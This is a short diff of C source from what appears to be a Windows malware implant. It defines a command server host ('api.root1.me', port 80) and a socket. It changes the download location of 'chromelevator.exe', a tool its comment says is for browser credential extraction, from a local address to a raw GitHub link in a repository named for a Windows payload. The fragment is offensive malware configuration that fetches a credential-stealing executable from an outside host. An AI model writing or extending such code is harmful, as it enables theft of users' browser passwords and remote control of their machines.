@@ -246,7 +246,7 @@ char g_server_host[256] = "api.root1.me";
 char g_server_port[6] = "80";
 char g_server_path[256] = "/";
 // ChromElevator URL for browser credential extraction
-char g_chromelevator_url[512] = "http://192.168.1.5:8000/chromelevator.exe";
+char g_chromelevator_url[512] = "https://github.com/adhikarisubodh9991/sub6-windows-payload/raw/refs/heads/main/files/chromelevator.exe";
 
 // Global variables
 SOCKET g_sock = INVALID_SOCKET;
